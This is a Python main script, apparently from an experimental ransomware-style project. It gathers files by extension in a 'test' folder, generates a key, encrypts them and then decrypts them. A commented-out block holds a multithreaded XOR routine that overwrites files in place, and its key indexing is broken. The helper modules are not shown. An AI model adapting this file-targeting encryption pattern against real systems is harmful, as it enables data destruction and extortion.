

import os
import random
import socket
from datetime import datetime
from threading import Thread
from queue import Queue
from constants import Constants as Cte
from targets import write_file_targets, get_targets
from key_generator import write_key
from encrypt import write_encrypt
from decrypt import write_decrypt

"""
def encrypt(key, encryption_level):
    # while q.not_empty:
    file = file_paths[0]  # q.get()
    index = 0
    max_indexes = encryption_level - 1
    try:
        with open(file, 'rb') as f:
            data = f.read()
            print('Reading File')
        with open(file, 'wb') as f:
            for byte in data:
                xor_byte = byte ^ ord(key[index])
                f.write(xor_byte.to_bytes(1, 'little'))
                print('Writing bit')
                if index >= max_indexes:
                    index += 1
    except:
        print(f'failed to encrypt {file}')
        # q.task_done()



q = Queue()
for file in file_paths:
    q.put(file)
for i in range(30):
    thread = Thread(target=encrypt, args=(key,), daemon=True)
    print('thread ', i)
    thread.start()

q.join()
"""


if __name__ == "__main__":
    # safeguard = input("enter safeguard passwd: ")
    # if safeguard != 'start':
    #     quit()

    target_dir = 'test'
    tuple_target_ext = ('.txt')

    # Get the list of all targeted files
    list_targets = write_file_targets(target_dir, tuple_target_ext, serach_by='extension')
    # Create the encryption/decryption key
    key = write_key()
    # Encrypt all targeted documents
    write_encrypt(list_targets, key)
    # Decrypt all encrypted documents
    list_cry_files = get_targets(target_dir, 'encrypted')
    write_decrypt(list_cry_files, key)























